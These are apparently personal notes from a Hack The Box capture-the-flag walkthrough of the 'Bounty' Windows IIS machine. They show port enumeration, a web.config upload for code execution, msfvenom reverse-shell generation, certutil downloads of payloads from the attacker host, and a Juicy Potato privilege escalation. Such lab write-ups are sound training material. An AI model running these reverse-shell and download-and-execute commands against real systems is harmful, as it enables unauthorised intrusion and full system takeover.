# Enumeration 

## open ports
```
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Port 80


![[Pasted image 20230117035251.png]]

![[Pasted image 20230117035301.png]]
/Transfer.aspx

![[Pasted image 20230117044659.png]]

trying to upload web.config using [Script](https://github.com/checkymander/CTF-Scripts/blob/master/RCE-Web.config)
and it got uploaded successfully now let's get a reverse shell 
using 
![[Reverse Shells#aspx web.config]]
first we generate a reverse shell
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=4444  -f exe -o rev.exe`
and change values in the script then upload it to the target
now we visit the directory we found earlier called uploadedfiles
![[Pasted image 20230117051919.png]]


![[Pasted image 20230117051030.png]]
we are in


# Privesc 

![[Pasted image 20230117051052.png]]
potato time

first we generate new reverse shell
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=4443  -f exe -o rev2.exe`
upload it
`certutil -urlcache -f http://10.10.16.19/rev2.exe rev2.exe`
``
upload juicy potato to the target and execute it
`certutil -urlcache -f http://10.10.16.19/jp.exe jp.exe`
`jp.exe -t * -p rev2.exe -l 9001 `
![[Pasted image 20230117051638.png]]
![[Pasted image 20230117051808.png]]
for some reason can't see user flag inside /merlin/desktop
![[Pasted image 20230117052734.png]]
so running 
`where /R c:\users user.txt`
![[Pasted image 20230117052652.png]]
Well that was weird 

---
Tags: #ctf #htb #potato #aspx #iis 
Resources: [Bounty](https://app.hackthebox.com/machines/142)